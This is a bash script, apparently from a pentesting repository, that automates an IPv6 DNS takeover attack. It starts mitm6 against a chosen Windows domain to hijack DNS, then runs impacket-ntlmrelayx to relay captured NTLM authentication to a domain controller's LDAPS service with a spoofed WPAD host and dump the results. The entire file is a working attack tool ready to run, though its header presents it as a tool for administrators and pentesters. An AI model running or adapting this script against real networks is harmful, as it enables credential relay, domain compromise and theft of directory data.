#!/bin/bash

# ===============================================================
# hexahavoc.sh - IPv6 DNS Takeover Automation Script
# ---------------------------------------------------------------
# This script automates the setup of an IPv6 DNS takeover attack 
# using mitm6 and impacket-ntlmrelayx, leveraging tmux to manage 
# the session. Designed for network administrators and pentesters
# to identify potential vulnerabilities in IPv6 DNS handling.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# ===============================================================


# Check if the tmux session already exists
echo "Checking if the tmux session 'ipv6_dns_takeover' already exists..."
if tmux has-session -t ipv6_dns_takeover 2>/dev/null; then
  tmux -CC attach-session -t ipv6_dns_takeover
  exit 0
fi

# Initialize variables with default values
target_domain=""
target_ip=""
interface="eth0"
verbose=0

# Parse command-line arguments
while getopts ":d:t:i:v" opt; do
  case "$opt" in
    d) target_domain="$OPTARG" ;;
    t) target_ip="$OPTARG" ;;
    i) interface="$OPTARG" ;;
    v) verbose=1 ;;
    \?) echo "Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v]"; exit 1 ;;
  esac
done

# Check if required arguments are provided
echo "Checking if both target domain and IP are provided..."
if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
  echo "Error: Both -d (target_domain) and -t (target_ip) arguments are required."
  echo "Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v]"
  exit 1
fi

# Check if mitm6 and impacket-ntlmrelayx are installed
echo "Checking if mitm6 is installed..."
if ! command -v mitm6 &> /dev/null; then
  echo "Error: mitm6 is not installed. Please install it before running this script."
  exit 1
fi

echo "Checking if impacket-ntlmrelayx is installed..."
if ! command -v impacket-ntlmrelayx &> /dev/null; then
  echo "Error: impacket-ntlmrelayx is not installed. Please install it before running this script."
  exit 1
fi

# Enable verbose logging if requested
if [ "$verbose" -eq 1 ]; then
  echo "Enabling verbose mode..."
  set -x
fi

# Create a new tmux session
echo "Creating a new tmux session named 'ipv6_dns_takeover'..."
tmux new-session -d -s ipv6_dns_takeover

# Create the first window for mitm6
echo "Starting mitm6 in the tmux session..."
tmux send-keys -t ipv6_dns_takeover:0.0 "python3 mitm6/mitm6/mitm6.py -i $interface -d $target_domain" C-m
tmux rename-window -t ipv6_dns_takeover:0 'mitm6'

# Create the second window for impacket-ntlmrelayx
echo "Starting impacket-ntlmrelayx in the tmux session..."
tmux new-window -t ipv6_dns_takeover:1 -n 'impacket-ntlmrelayx'
tmux send-keys -t ipv6_dns_takeover:1 "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh VCwpad.$target_domain -l dumps" C-m

# Attach to the tmux session
echo "Attaching to the tmux session 'ipv6_dns_takeover'..."
tmux -CC attach-session -t ipv6_dns_takeover

# Disable verbose logging
if [ "$verbose" -eq 1 ]; then
  echo "Disabling verbose mode..."
  set +x
fi
